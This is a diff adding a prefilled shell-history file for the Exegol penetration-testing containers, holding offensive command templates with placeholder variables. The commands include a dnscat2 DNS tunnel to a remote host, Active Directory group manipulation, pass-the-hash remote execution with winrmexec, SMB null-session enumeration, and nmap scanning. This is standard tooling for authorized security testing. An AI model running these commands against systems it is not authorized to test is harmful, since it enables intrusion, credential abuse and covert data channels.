@@ -1,0 +1,16 @@
+# Config file dedicated to the user's personal history shared between all exegol containers
+dnscat2 --dns host=$IP,port=$PORT,domain=$DOMAIN --no-cache
+subbrute "$TARGET" -s ./names.txt -r ./resolvers.txt
+JoomlaScan -u "http://$TARGET"
+ReconSpider "http://$TARGET"
+flask-unsign --decode --cookie ''
+flask-unsign -u --cookie ''
+addusertogroup.py -d "$DOMAIN" -g "$TARGET_GROUP" -a $TARGET_USER -u $USER -p $PASSWORD
+winrmexec -hashes ":$NT_HASH" "$DOMAIN/$USER@$IP"
+winrmexec "$DOMAIN/$USER:$PASSWORD@$IP"
+evil-winrmexec -hashes ":$NT_HASH" "$DOMAIN/$USER@$IP"
+evil-winrmexec "$DOMAIN/$USER:$PASSWORD@$IP"
+nxc smb "$IP" -u '' -p '' --generate-hosts-file /tmp/hosts; cat /tmp/hosts; read "?Ctrl+C to abord append." < /dev/tty && cat /tmp/hosts >> /etc/hosts
+nmap -sU --min-rate=5000 -p- $IP
+nmap -Pn -p- -T4 -oG nmap.grep $IP; nmap -sVC -Pn -p$(grep -oP '\d+(?=/open)' nmap.grep | paste -sd "," -) $IP;
+export IP=
